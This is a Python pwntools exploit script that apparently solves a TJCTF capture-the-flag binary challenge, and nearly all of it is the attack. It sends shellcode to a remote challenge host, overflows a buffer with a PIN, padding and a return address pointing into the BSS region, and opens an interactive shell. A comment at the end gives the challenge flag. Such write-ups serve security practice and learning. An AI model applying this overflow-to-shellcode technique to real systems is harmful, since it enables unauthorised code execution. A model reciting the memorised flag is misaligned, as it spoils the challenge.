#!/usr/bin/env python2
# -*- coding: utf-8 -*-
from pwn import *

exe = context.binary = ELF('problem')

host = args.HOST or 'problem1.tjctf.org'
port = int(args.PORT or 8005)

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

gdbscript = '''
break *0x{exe.symbols.main:x}
continue
'''.format(**locals())

# -- Exploit goes here --

context.terminal = ['gnome-terminal', '-e']
io = start()
with open('shellcode64.o', 'rb') as f:
    shell = f.read()

io.sendlineafter(': ', shell)
io.sendlineafter(': ', '1234')
io.sendlineafter('?', 'd')

# PIN + junk + return to BSS where we have shellcode
payload = '1234' + "A" * 13 + p64(0x6010A0)
io.sendline(payload)

io.interactive()
# tjctf{d4n6_17_y0u_r0pp3d_m3_:(}
